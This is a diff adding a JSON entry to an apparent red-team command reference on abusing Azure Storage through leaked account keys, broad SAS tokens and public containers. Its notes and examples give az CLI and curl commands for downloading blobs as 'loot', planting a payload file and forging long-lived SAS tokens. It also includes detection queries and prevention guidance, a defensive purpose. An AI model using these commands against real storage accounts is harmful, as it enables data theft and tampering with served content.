@@ -1,0 +1,104 @@
+{
+  "id": "azure-storage-sas-abuse",
+  "name": "Azure Storage - SAS Token & Account Key Abuse",
+  "command": "az storage blob list --account-name <target> --sas-token <token> --container-name <share>",
+  "description": "Abuse over-permissive Azure Storage access: leaked account keys (full control of a storage account), overly broad or long-lived SAS tokens, and anonymously readable blob containers. These let an attacker read and often write blobs, exfiltrate data, or plant malicious content - and account keys cannot be scoped or easily revoked without rotation that breaks every consumer.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Cloud Security",
+  "subcategory": "Azure Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "Microsoft docs / hackingthe.cloud",
+  "tags": [
+    "azure",
+    "storage",
+    "blob",
+    "sas-token",
+    "account-key",
+    "anonymous-access",
+    "exfiltration"
+  ],
+  "mitre": [
+    "T1552.005",
+    "T1530"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THREE ABUSE PATHS ===\n  1. Account key  -> full read/write/delete of the whole storage account.\n  2. SAS token    -> scoped URL; but over-broad (rwdlacup) or long-lived SAS\n                     still grants wide access if leaked.\n  3. Anonymous    -> containers set to public Blob/Container access need no auth.\n\n=== ANONYMOUS CONTAINER (no creds) ===\n  curl 'https://<target>.blob.core.windows.net/<share>?restype=container&comp=list'\n  az storage blob list --account-name <target> --container-name <share> --auth-mode login\n\n=== WITH A SAS TOKEN ===\n  az storage blob list --account-name <target> \\\n    --container-name <share> --sas-token '<token>'\n  az storage blob download --account-name <target> --container-name <share> \\\n    --name secret.txt --file loot.txt --sas-token '<token>'\n\n=== WITH AN ACCOUNT KEY (full control) ===\n  az storage account keys list --account-name <target> -g <rg>   # if you can read keys\n  az storage container list --account-name <target> --account-key <token>\n  az storage blob upload --account-name <target> --account-key <token> \\\n    --container-name <share> --name payload.html --file payload.html\n\n=== INSPECT / FORGE SAS (with a key) ===\n  az storage container generate-sas --account-name <target> \\\n    --name <share> --permissions rwdl --account-key <token> \\\n    --expiry 2030-01-01\n\n=== FIND LEAKS ===\n  SAS URLs leak in code, git history, config, Logic Apps, emails.",
+  "examples": [
+    {
+      "label": "List an anonymously-readable container",
+      "command": "curl 'https://<target>.blob.core.windows.net/<share>?restype=container&comp=list'"
+    },
+    {
+      "label": "Download a blob with a SAS token",
+      "command": "az storage blob download --account-name <target> --container-name <share> --name secret.txt --file loot.txt --sas-token '<token>'"
+    },
+    {
+      "label": "Forge a long-lived SAS with an account key",
+      "command": "az storage container generate-sas --account-name <target> --name <share> --permissions rwdl --account-key <token> --expiry 2030-01-01"
+    }
+  ],
+  "references": [
+    {
+      "title": "Microsoft docs - Grant limited access with SAS",
+      "url": "https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview"
+    },
+    {
+      "title": "hackingthe.cloud - Azure storage account abuse",
+      "url": "https://hackingthe.cloud/azure/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cloud-microburst",
+      "note": "MicroBurst enumerates storage accounts and public blobs.",
+      "rel": "prereq"
+    },
+    {
+      "id": "azure-arm-enum",
+      "note": "ARM enumeration to find storage accounts and keys.",
+      "rel": "prereq"
+    },
+    {
+      "id": "azure-managed-identity-token",
+      "note": "A managed identity may hold Storage data-plane roles.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Account keys grant unscoped full control and are shared static secrets; SAS tokens are bearer URLs that work for anyone who holds them until expiry; anonymous access serves blobs with no authentication. Over-broad configuration of any of these turns a leaked string or a public setting into data access.",
+    "prerequisites": "A leaked account key or SAS token, or a container configured for anonymous Blob/Container public access; for forging SAS, possession of (or the ability to list) an account key.",
+    "impact": "Read/write/delete of blob data - exfiltration of sensitive files, tampering with served content (e.g. static sites, scripts), and in the account-key case full control over the storage account.",
+    "detection": "[MITRE T1530] Storage diagnostic/StorageRead-StorageWrite logs showing access via SAS (authenticationType=SAS) or account key from unexpected IPs; anonymous (AnonymousSuccess) reads; az storage account keys list in Azure Activity; blob access from new ASNs.",
+    "artifacts": "Azure Monitor StorageBlobLogs (AuthenticationType, CallerIpAddress, Uri), Azure Activity 'List Storage Account Keys' operation, diagnostic settings showing anonymous success.",
+    "splunk_spl": "index=azure sourcetype=azure:activity operationName=\"*listKeys*\" OR operationNameValue=\"MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION\"\n| stats count by caller, resourceId, callerIpAddress",
+    "elastic_kql": "azure.activitylogs.operation_name:\"*listKeys*\" or azure.storage.authentication_type:\"SAS\"",
+    "sentinel_kql": "StorageBlobLogs\n| where AuthenticationType in (\"SAS\",\"Anonymous\")\n| summarize Count=count(), Ops=make_set(OperationName) by CallerIpAddress, AccountName, AuthenticationType\n| union (AzureActivity | where OperationNameValue has \"listKeys\")",
+    "sigma_rules": "azure_storage_sas_or_key_abuse",
+    "prevention": "Disable anonymous blob access at the account level; disable shared-key authorization and use Entra ID (RBAC) for the data plane; if SAS is required use short-lived user-delegation SAS with minimal permissions and a stored access policy for revocation; rotate account keys and store none in code; enable storage logging and alert on key listing and anonymous access.",
+    "sources": [
+      "https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview",
+      "https://hackingthe.cloud/azure/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Storage access via SAS/anonymous or account-key listing",
+        "logic": "StorageBlobLogs\n| where AuthenticationType in (\"SAS\",\"Anonymous\")\n| summarize Count=count(), Ops=make_set(OperationName) by CallerIpAddress, AccountName, AuthenticationType\n| where Count > 50",
+        "data_source": "azure-activity",
+        "attack": [
+          "T1530",
+          "T1552.005"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate apps/CDNs that use SAS or public containers for distribution",
+        "tuning": "Baseline expected SAS caller IPs and public containers; alert on new IPs/ASNs and on any listKeys outside change windows"
+      }
+    ]
+  }
+}
